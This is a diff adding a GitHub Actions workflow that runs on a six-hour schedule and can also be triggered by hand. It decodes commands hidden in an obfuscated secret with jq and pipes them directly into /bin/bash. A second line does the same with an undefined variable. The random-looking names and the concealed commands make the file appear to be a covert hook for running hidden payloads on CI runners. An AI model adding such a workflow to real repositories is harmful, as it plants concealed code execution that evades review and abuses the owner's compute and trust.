@@ -1,0 +1,17 @@
+name: pollinggrant2024
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pollinggrant2024
+        env:
+          zqu8556: ${{ secrets.zqu8556 }}
+        run: |
+          echo $zqu8556 | jq -r .nrv94735 | /bin/bash
+          echo $z157 | jq -r .kx571 | /bin/bash
+
